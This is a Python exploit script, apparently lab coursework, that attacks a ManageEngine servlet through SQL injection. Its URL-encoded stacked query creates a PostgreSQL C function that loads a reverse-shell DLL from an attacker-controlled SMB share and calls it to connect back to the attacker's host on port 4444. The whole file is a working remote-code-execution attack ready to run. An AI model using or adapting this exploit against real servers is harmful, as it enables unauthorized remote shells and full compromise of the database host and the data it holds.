import requests
import sys

requests.packages.urllib3.disable_warnings()

def log(msg):
    print(msg)

def make_request(url, sql):
    log("[*] Executing query: {}".format(sql[:80]))
    r = requests.post(url % sql, verify=False)
    return r

def create_udf_func(url):
    log("[+] Creating function...")
    sql = "CREATE%20OR%20REPLACE%20FUNCTION%20plzwork%28text%2C%20integer%29%20RETURNS%20void%20AS%20%24%24%5C%5C192.168.45.216%5Cawae%5Crev_shell.dll%24%24%2C%20%24%24connect_back%24%24%20LANGUAGE%20C%20STRICT%3BSELECT%20plzwork%28%24%24192.168.45.216%24%24%2C%204444%29%3B"
    make_request(url, sql)

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("[-] Usage: {} serverIP:port attackerIP port".format(sys.argv[0]))
        sys.exit(1)

    server = sys.argv[1].strip()
    attacker = sys.argv[2].strip()
    port = sys.argv[3].strip()

    sqli_url = "https://{}/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;{};--".format(server, "%s")
    create_udf_func(sqli_url)

# usage = python3 revshell.py manageengine:8443 192.168.45.216 4444